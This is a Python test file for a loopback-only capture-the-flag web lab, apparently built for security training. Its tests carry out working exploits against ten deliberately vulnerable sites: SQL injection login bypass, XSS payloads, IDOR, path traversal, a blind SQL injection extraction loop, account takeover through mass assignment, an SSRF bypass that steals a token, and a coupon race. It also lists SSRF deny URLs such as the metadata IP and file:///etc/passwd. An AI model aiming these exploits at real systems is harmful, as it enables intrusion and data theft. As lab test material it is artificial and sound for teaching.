"""HTTP regression and exploit checks; no third-party packages or external traffic."""
import http.client
import json
import secrets
import socket
import unittest
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode

from server import SITES, Suite


def free_base():
    for _ in range(100):
        base = 20000 + secrets.randbelow(35000)
        sockets = []
        try:
            for port in [*range(base, base + 11), base + 99]:
                connection = socket.socket()
                sockets.append(connection)
                connection.bind(('127.0.0.1', port))
            return base
        except OSError:
            pass
        finally:
            for connection in sockets:
                connection.close()
    raise RuntimeError('No free lab port range')


class Client:
    def __init__(self, port):
        self.port, self.cookie = port, ''

    def request(self, path='/', method='GET', data=None, headers=None):
        request_headers = {'Cookie': self.cookie}
        body = None
        if data is not None:
            body = json.dumps(data)
            request_headers['Content-Type'] = 'application/json'
        request_headers.update(headers or {})
        connection = http.client.HTTPConnection('127.0.0.1', self.port, timeout=5)
        try:
            connection.request(method, path, body, request_headers)
            response = connection.getresponse()
            raw = response.read().decode()
            result_headers = dict(response.getheaders())
            if 'Set-Cookie' in result_headers:
                self.cookie = result_headers['Set-Cookie'].split(';')[0]
            value = json.loads(raw) if 'application/json' in result_headers.get('Content-Type', '') else raw
            return response.status, value, result_headers
        finally:
            connection.close()

    def login(self):
        status, result, _ = self.request('/api/login', 'POST', {'username': 'analyst', 'password': 'lab123!'})
        if status != 200:
            raise AssertionError(result)


class LabTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.base = free_base()
        cls.suite = Suite(cls.base)
        cls.suite.start()

    @classmethod
    def tearDownClass(cls):
        cls.suite.close()

    def client(self, number):
        return Client(self.base + number)

    def test_all_ten_sites_and_portal_serve(self):
        for number in range(11):
            with self.subTest(number=number):
                status, body, _ = self.client(number).request()
                self.assertEqual(status, 200)
                self.assertIn('<!doctype html>', body)
                if number:
                    self.assertIn(SITES[number - 1][1], body)
                    self.assertNotIn(self.suite.labs[number - 1].flag, body)
        status, targets, _ = self.client(0).request('/api/targets')
        self.assertEqual(status, 200)
        self.assertEqual(len(targets['targets']), 10)
        self.assertEqual(sum(t['difficulty'] == 'easy' for t in targets['targets']), 5)

    def test_easy_01_sql_injection_with_admin_impact(self):
        client = self.client(1)
        self.assertEqual(client.request('/admin')[0], 403)
        client.login()
        self.assertEqual(client.request('/admin')[0], 403)
        self.assertEqual(client.request('/api/login', 'POST', {'username': "admin' -- ", 'password': 'bad'})[0], 200)
        status, result, _ = client.request('/admin')
        self.assertEqual(status, 200)
        self.assertEqual(result['flag'], self.suite.labs[0].flag)

    def test_easy_02_reflected_and_stored_html_sinks(self):
        client = self.client(2)
        _, _, headers = client.request()
        self.assertIn('lab_marker=LAB{', headers['Set-Cookie'])
        self.assertNotIn('HttpOnly', headers['Set-Cookie'])
        reflected = '<script>document.documentElement.dataset.proof="reflected"</script>'
        status, body, _ = client.request('/search?' + urlencode({'q': reflected}))
        self.assertEqual(status, 200)
        self.assertIn(reflected, body)
        stored = '<img src=x onerror="document.documentElement.dataset.proof=\'stored\'">'
        self.assertEqual(client.request('/messages', 'POST', {'body': stored})[0], 200)
        other = self.client(2)
        self.assertIn(stored, other.request('/messages')[1])

    def test_easy_03_authenticated_idor(self):
        client = self.client(3)
        self.assertEqual(client.request('/api/invoices/2001')[0], 401)
        client.login()
        self.assertEqual(client.request('/api/invoices/1001')[1]['owner'], 'analyst')
        status, result, _ = client.request('/api/invoices/2001')
        self.assertEqual(status, 200)
        self.assertEqual(result['private_note'], self.suite.labs[2].flag)
        self.assertEqual(client.request('/api/invoices/9999')[0], 404)

    def test_easy_04_virtual_directory_traversal(self):
        client = self.client(4)
        self.assertIn('Field Docs guide', client.request('/download?file=guide.txt')[1])
        status, body, _ = client.request('/download?' + urlencode({'file': '../private/config.ini'}))
        self.assertEqual(status, 200)
        self.assertIn(self.suite.labs[3].flag, body)
        for name in ('../../../../Windows/win.ini', '../../../../etc/passwd', '../server.py'):
            self.assertEqual(client.request('/download?' + urlencode({'file': name}))[0], 404)

    def test_easy_05_backup_key_chain(self):
        client = self.client(5)
        self.assertEqual(client.request('/api/admin?key=wrong')[0], 403)
        self.assertIn('/backup/', client.request('/robots.txt')[1])
        self.assertIn('/backup/config.json', client.request('/backup/')[1])
        key = client.request('/backup/config.json')[1]['admin_api_key']
        status, result, _ = client.request('/api/admin?' + urlencode({'key': key}))
        self.assertEqual(status, 200)
        self.assertEqual(result['flag'], self.suite.labs[4].flag)

    def test_hard_01_second_order_blind_oracle_extracts_flag(self):
        client = self.client(6)
        client.login()

        def oracle(condition):
            payload = "missing%' OR (" + condition + ') -- '
            status, saved, _ = client.request('/api/searches', 'POST', {'filter': {'title': payload}})
            self.assertEqual(status, 201)
            status, result, _ = client.request(saved['run'], 'POST', {})
            self.assertEqual(status, 200)
            self.assertEqual(set(result), {'available', 'source'})
            return result['available']

        normal = client.request('/api/searches', 'POST', {'filter': {'title': 'Notebook'}})[1]
        missing = client.request('/api/searches', 'POST', {'filter': {'title': 'nonexistent'}})[1]
        self.assertTrue(client.request(normal['run'], 'POST', {})[1]['available'])
        self.assertFalse(client.request(missing['run'], 'POST', {})[1]['available'])
        self.assertTrue(oracle('1=1'))
        self.assertFalse(oracle('1=2'))
        # Infer length and every character through the saved-filter worker.
        length = 0
        while oracle(f'(SELECT length(value) FROM secrets)>{length}'):
            length += 1
            self.assertLess(length, 100)
        recovered = ''
        for index in range(1, length + 1):
            low, high = 32, 126
            while low < high:
                mid = (low + high) // 2
                if oracle(f'(SELECT unicode(substr(value,{index},1)) FROM secrets)>{mid}'):
                    low = mid + 1
                else:
                    high = mid
            recovered += chr(low)
        self.assertEqual(recovered, self.suite.labs[5].flag)

    def test_hard_02_identity_overposting_reset_chain(self):
        client = self.client(7)
        self.assertEqual(client.request('/api/profile')[0], 401)
        client.login()
        self.assertEqual(client.request('/api/admin/report')[0], 403)
        self.assertEqual(client.request('/api/profile', 'PATCH', {'display_name': 'Test'})[1]['role'], 'member')
        self.assertEqual(client.request('/api/admin/report')[0], 403)
        # Direct role overposting is ineffective; the internal user id is writable.
        self.assertEqual(client.request('/api/profile', 'PATCH', {'role': 'admin'})[1]['role'], 'member')
        self.assertEqual(client.request('/api/profile', 'PATCH', {'id': 2})[1]['id'], 2)
        client.request('/api/password-reset', 'POST', {'username': 'admin'})
        token = client.request('/api/notifications')[1]['items'][-1]['token']
        new_password = 'reset-lab-2026!'
        self.assertEqual(client.request('/api/password-reset/confirm', 'POST',
                                        {'token': token, 'new_password': new_password})[0], 200)
        self.assertEqual(client.request('/api/login', 'POST', {'username': 'admin', 'password': new_password})[0], 200)
        self.assertEqual(client.request('/api/admin/report')[1]['flag'], self.suite.labs[6].flag)

    def test_hard_03_cross_tenant_export_bypass(self):
        client = self.client(8)
        client.login()
        self.assertEqual(client.request('/api/organizations/northstar/summary')[0], 403)
        self.assertEqual(client.request('/api/organizations/acme/summary')[0], 200)
        self.assertEqual(client.request('/api/organizations/northstar/exports', 'POST', {'format': 'json'})[0], 403)
        operations = [{'action': 'export', 'organization': 'acme'},
                      {'action': 'export', 'organization': 'northstar'}]
        status, batch, _ = client.request('/api/batch', 'POST', {'operations': operations})
        self.assertEqual(status, 200)
        self.assertEqual([item['status'] for item in batch['results']], [201, 201])
        export = batch['results'][1]
        other = self.client(8)
        self.assertEqual(other.request(export['download'])[0], 401)
        status, result, _ = client.request(export['download'])
        self.assertEqual(status, 200)
        self.assertEqual(result['records'][0]['memo'], self.suite.labs[7].flag)

    def test_hard_04_ssrf_service_token_chain(self):
        client = self.client(9)
        self.assertEqual(client.request('/api/admin/export')[0], 403)
        self.assertEqual(Client(self.base + 99).request('/internal/config')[0], 403)
        public = client.request('/api/preview', 'POST', {'url': 'http://preview.internal/public/help'})[1]
        asset = json.loads(public['content'])['assets'][0]
        script = client.request('/api/preview', 'POST', {'url': 'http://preview.internal' + asset})[1]['content']
        self.assertIn('/internal/config', script)
        bypass = f'http://preview.internal@127.0.0.1:{self.base + 99}/internal/config'
        status, response, _ = client.request('/api/preview', 'POST', {'url': bypass})
        self.assertEqual(status, 200)
        token = json.loads(response['content'])['service_token']
        status, result, _ = client.request('/api/admin/export', headers={'Authorization': 'Bearer ' + token})
        self.assertEqual(status, 200)
        self.assertEqual(result['flag'], self.suite.labs[8].flag)

    def test_hard_05_coupon_redemption_race(self):
        client = self.client(10)
        client.login()
        self.assertEqual(client.request('/api/wallet')[1]['credits'], 30)
        self.assertEqual(client.request('/api/purchase', 'POST', {'product': 'premium-report'})[0], 402)
        order = client.request('/api/orders', 'POST', {'product': 'notebook'})[1]['order_id']
        payload = {'code': 'WELCOME20', 'order_id': order}
        racers = [self.client(10) for _ in range(8)]
        for racer in racers:
            racer.cookie = client.cookie
        with ThreadPoolExecutor(max_workers=8) as pool:
            statuses = list(pool.map(lambda racer: racer.request('/api/coupons/redeem', 'POST', payload)[0], racers))
        self.assertGreaterEqual(statuses.count(200), 4)
        self.assertEqual(client.request('/api/coupons/redeem', 'POST', payload)[0], 409)
        self.assertGreaterEqual(client.request('/api/wallet')[1]['credits'], 110)
        status, result, _ = client.request('/api/purchase', 'POST', {'product': 'premium-report'})
        self.assertEqual(status, 200)
        self.assertEqual(result['flag'], self.suite.labs[9].flag)

    def test_sessions_and_wallets_are_isolated(self):
        client = self.client(7)
        client.login()
        client.request('/api/profile', 'PATCH', {'id': 2})
        other_site = self.client(8)
        other_site.cookie = client.cookie
        self.assertEqual(other_site.request('/api/me')[0], 401)
        one, two = self.client(10), self.client(10)
        one.login()
        two.login()
        order = one.request('/api/orders', 'POST', {'product': 'notebook'})[1]['order_id']
        self.assertEqual(two.request('/api/coupons/redeem', 'POST', {'code': 'WELCOME20', 'order_id': order})[0], 400)

    def test_non_sql_labs_have_parameterized_login(self):
        for number in range(2, 11):
            with self.subTest(number=number):
                self.assertEqual(self.client(number).request('/api/login', 'POST', {'username': "admin' -- ", 'password': 'bad'})[0], 401)

    def test_ssrf_boundary_rejects_other_hosts_protocols_and_ports(self):
        client = self.client(9)
        for url in ('http://example.com/', 'http://169.254.169.254/', 'file:///etc/passwd',
                    'http://127.0.0.1:22/', 'http://localhost:' + str(self.base + 99),
                    'http://preview.internal@example.com/internal/config',
                    'http://preview.internal[broken'):
            with self.subTest(url=url):
                self.assertEqual(client.request('/api/preview', 'POST', {'url': url})[0], 400)

    def test_host_and_origin_boundary(self):
        client = self.client(1)
        self.assertEqual(client.request(headers={'Host': 'attacker.invalid'})[0], 403)
        self.assertEqual(client.request('/api/login', 'POST', {}, {'Origin': 'https://attacker.invalid'})[0], 403)
        self.assertEqual(client.request(headers={'Host': f'localhost:{self.base + 1}'})[0], 200)

    def test_only_loopback_listeners(self):
        self.assertEqual(len(self.suite.servers), 12)
        for server in self.suite.servers:
            self.assertEqual(server.server_address[0], '127.0.0.1')

    def test_operator_files_never_served(self):
        for number in range(11):
            with self.subTest(number=number):
                client = self.client(number)
                self.assertEqual(client.request('/operator/SOLUTIONS.md')[0], 404)
                self.assertEqual(client.request('/server.py')[0], 404)

    def test_malformed_json_is_rejected(self):
        connection = http.client.HTTPConnection('127.0.0.1', self.base + 6, timeout=3)
        try:
            connection.request('POST', '/api/search', '{bad', {'Content-Type': 'application/json'})
            response = connection.getresponse()
            self.assertEqual(response.status, 400)
            response.read()
        finally:
            connection.close()


if __name__ == '__main__':
    unittest.main(verbosity=2)
